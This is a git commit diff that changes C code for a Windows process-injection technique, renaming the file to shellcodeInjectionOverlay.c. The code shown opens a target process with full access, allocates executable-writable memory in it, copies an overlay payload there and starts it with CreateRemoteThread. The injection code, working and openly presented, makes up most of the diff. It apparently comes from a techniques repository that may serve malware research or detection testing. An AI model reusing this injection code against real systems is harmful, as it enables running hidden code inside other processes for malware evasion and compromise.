ec70e146ae334a21ec4151dc68116867718e154c
Tomas-Pajtinka <52199126+Tomas-Pajtinka@users.noreply.github.com>
2021-11-04 21:00:00 +0100

    Update and rename remoteExeInjectionOverlay.c to shellcodeInjectionOverlay.c

--- C/Techniques/Injections/shellcodeInjectionOverlay.c
+++ C/Techniques/Injections/shellcodeInjectionOverlay.c
@@ -13,19 +13,20 @@ void remoteExeInjection(){
     struct Overlay overlay;
     getOverlay(&overlay);
 
-    int pid = findPidOf32BitProcess(6000);
+    int pid = findPidOf32BitProcess(0);
     if (pid == 0){
         perror("Injection failed. Suitable process could not be found.\n");
         exit(EXIT_FAILURE);
     }
 
+    printf("%4d\n", pid);
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (hProcess == INVALID_HANDLE_VALUE){
         perror("Injection failed. Process could not be opened.\n");
         exit(EXIT_FAILURE);
     }
 
-    LPVOID remoteProcessAddress = VirtualAllocEx(hProcess, NULL, overlay.overlaySize, MEM_COMMIT, PAGE_READWRITE);
+    LPVOID remoteProcessAddress = VirtualAllocEx(hProcess, NULL, overlay.overlaySize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (remoteProcessAddress == NULL){
         perror("Injection failed. Could not allocate memory in remote process.\n");
         exit(EXIT_FAILURE);
@@ -36,16 +37,9 @@ void remoteExeInjection(){
         exit(EXIT_FAILURE);
     }
 
-    int peEntryPoint = getExecutableEntryPointFromOverlay((struct Executable *) &overlay);
-    LPVOID remoteEntryPoint = (LPVOID)((int)remoteProcessAddress + peEntryPoint);
-    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, 0, NULL);
+    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteProcessAddress, NULL, 0, NULL);
     if(hNewThread == NULL){
         perror("Injection failed. Could not create remote thread.\n");
-        exit(EXIT_FAILURE);
-    }
-
-    if(VirtualProtectEx(hProcess, remoteProcessAddress, overlay.overlaySize, PAGE_EXECUTE_READ, (PDWORD)PAGE_READWRITE) == 0){
-        perror("Injection failed. Could not change memory protection in remote process.\n");
         exit(EXIT_FAILURE);
     }
 
